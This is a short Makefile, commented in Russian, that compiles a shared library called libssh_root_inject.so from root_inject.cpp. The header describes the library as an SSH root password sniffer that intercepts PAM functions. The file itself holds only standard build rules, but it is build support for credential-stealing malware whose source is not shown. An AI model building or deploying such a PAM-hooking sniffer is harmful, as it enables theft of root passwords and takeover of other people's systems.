# Makefile для компиляции SSH Root Password Sniffer
# Создает разделяемую библиотеку для перехвата PAM-функций
# GitHub: https://github.com/Personaz1/ScrScr

# Компилятор C++
CXX = g++
# Флаги компиляции:
# -shared: создать разделяемую библиотеку
# -fPIC: позиционно-независимый код (нужен для разделяемых библиотек)
# -std=c++11: использовать стандарт C++11
# -Wall: показывать все предупреждения 
# -O2: оптимизация 2-го уровня
CXXFLAGS = -shared -fPIC -std=c++11 -Wall -O2
# Флаги линковщика: 
# -ldl: подключить библиотеку для динамической загрузки (dlsym)
LDFLAGS = -ldl

# Имя выходного файла (разделяемая библиотека)
TARGET = libssh_root_inject.so
# Исходный файл
SOURCE = root_inject.cpp

# Цель по умолчанию
all: $(TARGET)

# Правило компиляции
$(TARGET): $(SOURCE)
	$(CXX) $(CXXFLAGS) -o $@ $< $(LDFLAGS)

# Очистка собранных файлов
clean:
	rm -f $(TARGET)

# Фиктивные цели (не соответствуют файлам)
.PHONY: all clean 